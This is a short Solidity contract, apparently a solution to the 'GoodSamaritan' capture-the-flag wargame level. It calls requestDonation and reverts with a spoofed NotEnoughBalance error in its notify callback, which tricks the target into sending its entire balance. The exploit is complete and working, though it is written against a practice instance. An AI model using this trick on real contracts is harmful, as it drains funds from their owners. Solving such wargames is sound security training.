// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../instances/GoodSamaritan.sol";

contract BadSamaritan {

    error NotEnoughBalance();
    
    GoodSamaritan goodsamaritan;

    constructor(address _goodsamaritan) public {
        goodsamaritan = GoodSamaritan(_goodsamaritan);
    }

    function attax() external {
        goodsamaritan.requestDonation();
    }

    function notify(uint256 amount) external pure {
        if (amount <= 10) {
            revert NotEnoughBalance();
        }
    }
}

